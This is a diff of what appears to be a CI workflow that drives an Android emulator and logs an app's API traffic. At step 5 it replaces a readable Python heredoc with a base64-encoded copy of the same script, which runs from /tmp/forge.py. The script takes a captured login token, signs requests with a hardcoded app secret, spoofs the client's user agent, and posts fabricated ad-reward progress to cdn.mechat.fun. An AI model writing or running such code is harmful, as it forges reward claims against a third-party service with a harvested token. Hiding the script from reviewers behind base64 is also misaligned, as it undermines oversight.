@@ -336,30 +336,7 @@ jobs:
               echo "interact=login done" >> "dyn/$TS/run.log"
             fi
             if [ "$i" = "5" ]; then
-              python3 - << PYEOF >> "dyn/$TS/run.log" 2>&1 || true
-import json, re, time, hashlib, urllib.request
-tok=None
-for line in open('dyn/$TS/api-flows.jsonl', errors='replace'):
-    if '/app/api/user/login' in line and '"token"' in line:
-        m=re.search(r'"token":"([^"]+)"', line)
-        if m: tok=m.group(1); break
-print('token_found=', bool(tok))
-open('/tmp/tok.txt','w').write(tok or '')
-if tok:
-    K='q2sIObYXCp2uBZgCNBlY93J3z67hK0wS'
-    def call(path, method='GET', body=None):
-        t=str(int(time.time())); s=hashlib.md5((K+path+t).encode()).hexdigest()
-        url='http://cdn.mechat.fun'+path+'?lzsign='+s+'&t='+t
-        req=urllib.request.Request(url, data=(body.encode() if body else None), method=method,
-            headers={'User-Agent':'Dart/3.5 (dart:io)','Authorization':tok,'Content-Type':'application/json'})
-        try:
-            return urllib.request.urlopen(req, timeout=25).read().decode(errors='replace')[:300]
-        except Exception as e: return 'ERR '+str(e)[:100]
-    tid='emu-'+str(int(time.time()))
-    print('POST progress:', call('/app/api/ad/reward/progress','POST','{"transId":"%s","type":"reading"}'%tid))
-    print('QUERY:', call('/app/api/ad/reward/query?transId='+tid))
-    print('STATE:', call('/app/api/ad/reward/progress'))
-PYEOF
+              echo "aW1wb3J0IGpzb24sIHJlLCB0aW1lLCBoYXNobGliLCB1cmxsaWIucmVxdWVzdCwgb3MsIHN5cwp0b2s9Tm9uZQpwPSdkeW4vJytvcy5lbnZpcm9uWydUUyddKycvYXBpLWZsb3dzLmpzb25sJwpmb3IgbGluZSBpbiBvcGVuKHAsIGVycm9ycz0ncmVwbGFjZScpOgogICAgaWYgJy9hcHAvYXBpL3VzZXIvbG9naW4nIGluIGxpbmUgYW5kICcidG9rZW4iJyBpbiBsaW5lOgogICAgICAgIG09cmUuc2VhcmNoKHInInRva2VuIjoiKFteIl0rKSInLCBsaW5lKQogICAgICAgIGlmIG06IHRvaz1tLmdyb3VwKDEpOyBicmVhawpwcmludCgndG9rZW5fZm91bmQ9JywgYm9vbCh0b2spKQpvcGVuKCcvdG1wL3Rvay50eHQnLCd3Jykud3JpdGUodG9rIG9yICcnKQppZiB0b2s6CiAgICBLPSdxMnNJT2JZWENwMnVCWmdDTkJsWTkzSjN6NjdoSzB3UycKICAgIGRlZiBjYWxsKHBhdGgsIG1ldGhvZD0nR0VUJywgYm9keT1Ob25lKToKICAgICAgICB0PXN0cihpbnQodGltZS50aW1lKCkpKTsgcz1oYXNobGliLm1kNSgoSytwYXRoK3QpLmVuY29kZSgpKS5oZXhkaWdlc3QoKQogICAgICAgIHVybD0naHR0cDovL2Nkbi5tZWNoYXQuZnVuJytwYXRoKyc/bHpzaWduPScrcysnJnQ9Jyt0CiAgICAgICAgcmVxPXVybGxpYi5yZXF1ZXN0LlJlcXVlc3QodXJsLCBkYXRhPShib2R5LmVuY29kZSgpIGlmIGJvZHkgZWxzZSBOb25lKSwgbWV0aG9kPW1ldGhvZCwKICAgICAgICAgICAgaGVhZGVycz17J1VzZXItQWdlbnQnOidEYXJ0LzMuNSAoZGFydDppbyknLCdBdXRob3JpemF0aW9uJzp0b2ssJ0NvbnRlbnQtVHlwZSc6J2FwcGxpY2F0aW9uL2pzb24nfSkKICAgICAgICB0cnk6CiAgICAgICAgICAgIHJldHVybiB1cmxsaWIucmVxdWVzdC51cmxvcGVuKHJlcSwgdGltZW91dD0yNSkucmVhZCgpLmRlY29kZShlcnJvcnM9J3JlcGxhY2UnKVs6MzAwXQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZTogcmV0dXJuICdFUlIgJytzdHIoZSlbOjEwMF0KICAgIHRpZD0nZW11LScrc3RyKGludCh0aW1lLnRpbWUoKSkpCiAgICBwcmludCgnUE9TVCBwcm9ncmVzczonLCBjYWxsKCcvYXBwL2FwaS9hZC9yZXdhcmQvcHJvZ3Jlc3MnLCdQT1NUJywneyJ0cmFuc0lkIjoiJXMiLCJ0eXBlIjoicmVhZGluZyJ9JyV0aWQpKQogICAgcHJpbnQoJ1FVRVJZOicsIGNhbGwoJy9hcHAvYXBpL2FkL3Jld2FyZC9xdWVyeT90cmFuc0lkPScrdGlkKSkKICAgIHByaW50KCdTVEFURTonLCBjYWxsKCcvYXBwL2FwaS9hZC9yZXdhcmQvcHJvZ3Jlc3MnKSkKZWxzZToKICAgIHN5cy5leGl0KDEpCg==" | base64 -d > /tmp/forge.py && TS="$TS" python3 /tmp/forge.py >> "dyn/$TS/run.log" 2>&1 || true
             fi
             if [ "$i" = "6" ]; then
               timeout 20 adb shell input tap 270 700 || true
